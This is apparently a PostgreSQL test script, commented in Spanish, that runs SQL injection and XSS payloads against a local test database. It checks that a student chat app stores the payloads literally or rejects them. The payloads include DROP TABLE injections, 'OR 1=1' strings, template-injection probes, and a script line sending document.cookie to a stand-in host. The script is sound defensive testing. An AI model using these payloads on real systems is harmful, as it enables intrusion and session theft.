-- Batería de payloads de inyección SQL / XSS contra los campos de texto libre
-- y los campos con formato restringido (código, nombre visible, versión, enum).
-- No ataca producción: corre contra la base de prueba local (ver README).
-- Idea: si esto "falla" (no lanza FALLO), es señal de que falta un control.
\set ON_ERROR_STOP 1

insert into auth.users (id, email, is_anonymous) values
 ('60000000-0000-4000-8000-000000000060', null, true),   -- estudiante nuevo, sin tocar los datos de las pruebas 04/05
 ('61000000-0000-4000-8000-000000000061', 'intento@ejemplo.cl', false)
on conflict do nothing;

set role authenticated;
set request.jwt.claim.sub = '60000000-0000-4000-8000-000000000060';
insert into usuarios (id) values ('60000000-0000-4000-8000-000000000060') on conflict do nothing;
insert into conversaciones (id, tema) values ('6c000000-0000-4000-8000-0000000006c0', 'otro') on conflict do nothing;

-- ===== 1) "texto" libre (mensajes): SQLi/XSS deben quedar como TEXTO LITERAL, nunca ejecutarse =====
\echo '--- 1a) clásico "OR 1=1" como mensaje ---'
insert into mensajes (conversacion_id, rol_autor, texto)
  values ('6c000000-0000-4000-8000-0000000006c0', 'estudiante', E'x'' OR ''1''=''1');
do $$ begin
  if (select texto from mensajes where conversacion_id='6c000000-0000-4000-8000-0000000006c0' order by creado_en desc limit 1)
     <> E'x'' OR ''1''=''1' then
    raise exception 'FALLO: el texto no se guardó literal (hubo interpretación inesperada)';
  end if;
end $$;

\echo '--- 1b) DROP TABLE como mensaje: debe guardarse como string, la tabla debe seguir existiendo ---'
insert into mensajes (conversacion_id, rol_autor, texto)
  values ('6c000000-0000-4000-8000-0000000006c0', 'estudiante', E'''); DROP TABLE mensajes; --');
do $$ begin
  if to_regclass('public.mensajes') is null then raise exception 'FALLO CRÍTICO: se ejecutó el DROP TABLE'; end if;
end $$;

\echo '--- 1c) XSS/script en mensaje: se guarda literal (la UI lo renderiza con textContent, nunca con innerHTML) ---'
insert into mensajes (conversacion_id, rol_autor, texto)
  values ('6c000000-0000-4000-8000-0000000006c0', 'estudiante', E'<script>fetch("https://evil.test/?c="+document.cookie)</script>');
do $$ declare t text; begin
  select texto into t from mensajes where conversacion_id='6c000000-0000-4000-8000-0000000006c0' order by creado_en desc limit 1;
  if t is distinct from E'<script>fetch("https://evil.test/?c="+document.cookie)</script>' then
    raise exception 'FALLO: el payload XSS se alteró de forma inesperada: %', t;
  end if;
end $$;

-- Nota: un byte NUL (\x00) ni siquiera es representable en un literal text de Postgres
-- (y tampoco en JSON, que es como viaja desde la app vía PostgREST), así que no es un
-- caso de prueba útil aquí: el motor ya lo bloquea antes de llegar a limpiar_texto().
\echo '--- 1d) caracteres de control/invisibles: deben limpiarse (igual que 05), no romper la fila ---'
insert into mensajes (conversacion_id, rol_autor, texto)
  values ('6c000000-0000-4000-8000-0000000006c0', 'estudiante', E'\x07hola​\x1b');
do $$ declare t text; begin
  select texto into t from mensajes where conversacion_id='6c000000-0000-4000-8000-0000000006c0' order by creado_en desc limit 1;
  if t <> 'hola' then raise exception 'FALLO: no se limpiaron los caracteres de control/invisibles: %', t; end if;
end $$;

\echo '--- 1e) mensaje de 5000 caracteres: debe truncarse a 1000 (limpiar_texto) o la fila debe fallar por el check ---'
do $$ declare ok boolean := false; begin
  insert into mensajes (conversacion_id, rol_autor, texto)
    values ('6c000000-0000-4000-8000-0000000006c0', 'estudiante', repeat('a', 5000));
  if (select char_length(texto) from mensajes where conversacion_id='6c000000-0000-4000-8000-0000000006c0' order by creado_en desc limit 1) <= 1000 then
    ok := true;
  end if;
  if not ok then raise exception 'FALLO: se guardó un texto de más de 1000 caracteres'; end if;
end $$;

-- ===== 2) Campos con formato restringido: deben RECHAZAR el payload (no solo "guardarlo seguro") =====
\echo '--- 2a) código de derivación con inyección/XSS: debe rechazarse ---'
do $$
declare payloads text[] := array[
  E'''); DROP TABLE derivaciones; --',
  E'<script>alert(1)</script>',
  E'INH-ABC123'' OR ''1''=''1',
  E'1 OR 1=1'
];
declare p text; ok boolean;
begin
  foreach p in array payloads loop
    ok := false;
    begin
      insert into derivaciones (id, canal, codigo, fecha) values (gen_random_uuid(), 'cesfam', p, now());
    exception when others then ok := true;
    end;
    if not ok then raise exception 'FALLO: se aceptó un código de derivación inválido: %', p; end if;
  end loop;
end $$;

\echo '--- 2b) nombre_visible del personal con inyección/XSS: debe rechazarse ---'
do $$
declare payloads text[] := array[
  E'<script>alert(1)</script>',
  E'Robert''); DROP TABLE personal;--',
  E'${7*7}',
  E'{{7*7}}',
  E'admin<img src=x onerror=alert(1)>'
];
declare p text; ok boolean;
begin
  foreach p in array payloads loop
    ok := false;
    begin
      insert into personal (user_id, rol, nombre_visible) values ('61000000-0000-4000-8000-000000000061', 'tutor', p);
      delete from personal where user_id = '61000000-0000-4000-8000-000000000061'; -- por si se coló, limpiar para el siguiente intento
    exception when others then ok := true;
    end;
    if not ok then raise exception 'FALLO: se aceptó un nombre_visible inválido: %', p; end if;
  end loop;
end $$;

\echo '--- 2c) version_app con inyección: debe rechazarse ---'
do $$
declare payloads text[] := array[E'1.0.0; DROP TABLE usuarios;--', E'<script>', E'99999999999999999999'];
declare p text; ok boolean;
begin
  foreach p in array payloads loop
    ok := false;
    begin
      update usuarios set version_app = p where id = '60000000-0000-4000-8000-000000000060';
    exception when others then ok := true;
    end;
    if not ok then raise exception 'FALLO: se aceptó un version_app inválido: %', p; end if;
  end loop;
end $$;

-- ===== 3) Campos "enum" (whitelist por check constraint): un valor fuera de la lista debe rechazarse =====
\echo '--- 3a) tema/canal/rol_autor con intento de inyección: el check constraint debe rechazar ---'
do $$ declare ok boolean := false; begin
  begin insert into conversaciones (id, tema) values (gen_random_uuid(), E'otro''; DROP TABLE conversaciones; --');
  exception when others then ok := true; end;
  if not ok then raise exception 'FALLO: el check de "tema" aceptó un valor fuera de la lista'; end if;
end $$;
do $$ declare ok boolean := false; begin
  begin insert into derivaciones (id, canal, codigo, fecha) values (gen_random_uuid(), E'cesfam'' OR ''1''=''1', 'INH-ZZZ999', now());
  exception when others then ok := true; end;
  if not ok then raise exception 'FALLO: el check de "canal" aceptó un valor fuera de la lista'; end if;
end $$;

-- ===== 4) Parámetros de funciones RPC (asignar_rol, bloquear_ip): deben tratarse como datos, no como SQL =====
\echo '--- 4a) asignar_rol con nombre "malicioso": solo puede fallar por el rol del llamante o por el check de nombre_visible, nunca ejecutar SQL extra ---'
set request.jwt.claim.sub = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';  -- admin ya creado en la prueba 05
do $$ declare ok boolean := false; begin
  begin perform public.asignar_rol('intento@ejemplo.cl', 'tutor', E'''); DROP TABLE personal; --');
  exception when others then ok := true; end;
  if not ok then raise exception 'FALLO: asignar_rol aceptó un nombre_visible con inyección'; end if;
  if to_regclass('public.personal') is null then raise exception 'FALLO CRÍTICO: se ejecutó SQL inyectado vía asignar_rol'; end if;
end $$;

\echo '--- 4b) bloquear_ip con motivo malicioso: se guarda como texto literal, limpiado, nunca ejecutado ---'
select public.bloquear_ip('203.0.113.55', 10, E'motivo''); DROP TABLE ips_bloqueadas; --<script>x</script>');
do $$ begin
  if to_regclass('public.ips_bloqueadas') is null then raise exception 'FALLO CRÍTICO: se ejecutó SQL inyectado vía bloquear_ip'; end if;
  if not exists (select 1 from ips_bloqueadas where ip = '203.0.113.55') then raise exception 'FALLO: no se guardó el bloqueo'; end if;
end $$;

reset role;
reset request.jwt.claim.sub;
\echo 'TODAS LAS PRUEBAS DE INYECCIÓN SQL/XSS PASARON (ningún payload se ejecutó ni se aceptó donde no debía)'
